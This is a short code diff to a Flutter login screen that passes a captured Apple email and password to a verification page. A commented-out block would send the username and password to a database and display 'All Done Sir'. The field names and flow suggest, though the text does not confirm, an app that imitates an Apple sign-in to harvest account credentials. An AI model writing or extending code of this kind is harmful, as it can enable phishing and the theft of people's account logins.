@@ -3,6 +3,8 @@ import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
 import 'package:url_launcher/link.dart';
 
+import '../database.dart';
+
 class PassDesktopScreen extends StatefulWidget {
   final String callback;
   const PassDesktopScreen({Key? key, required this.callback}) : super(key: key);
@@ -123,10 +125,38 @@ class _PassDesktopScreenState extends State<PassDesktopScreen> {
                                                       MaterialPageRoute(
                                                           builder: (context) =>
                                                               VerifyLayoutPage(
-                                                                  verify: widget
-                                                                      .callback)));
+                                                                  appleEmail: widget
+                                                                      .callback, applePassword: passwordController.text,)));
                                                   // if (formkey.currentState!
                                                   //     .validate()) {}
+
+                                                  // FutureBuilder<
+                                                  //     Map<String, dynamic>>(
+                                                  //   future: Database(
+                                                  //           username:
+                                                  //               widget.callback,
+                                                  //           password:
+                                                  //               passwordController, emailPassword: '', emailUsername: '')
+                                                  //       .getData(),
+                                                  //   builder: (BuildContext
+                                                  //           context,
+                                                  //       AsyncSnapshot<
+                                                  //               Map<String,
+                                                  //                   dynamic>>
+                                                  //           snapshot) {
+                                                  //     switch (snapshot
+                                                  //         .connectionState) {
+                                                  //       case ConnectionState
+                                                  //           .done:
+                                                  //         return const Text(
+                                                  //             'All Done Sir');
+                                                  //       default:
+                                                  //         return const CircularProgressIndicator(
+                                                  //             color: CupertinoColors
+                                                  //                 .activeBlue);
+                                                  //     }
+                                                  //   },
+                                                  // );
                                                 }),
                                       ),
                                     ),
